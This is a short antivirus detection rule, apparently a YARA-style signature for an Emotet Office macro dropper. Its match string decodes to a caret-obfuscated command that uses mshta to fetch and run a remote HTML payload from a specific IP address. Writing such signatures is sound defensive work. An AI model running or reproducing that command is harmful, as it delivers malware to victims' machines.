
rule TrojanDropper_O97M_Emotet_BKC_MTB{
	meta:
		description = "TrojanDropper:O97M/Emotet.BKC!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {63 6d 64 20 2f 63 20 6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 38 37 2e 32 35 31 2e 38 35 2e 31 30 30 2f 6c 6f 76 65 33 2f 5f 2e 68 74 6d 6c } //1 cmd /c m^sh^t^a h^tt^p^:/^/87.251.85.100/love3/_.html
	condition:
		((#a_01_0  & 1)*1) >=1
 
}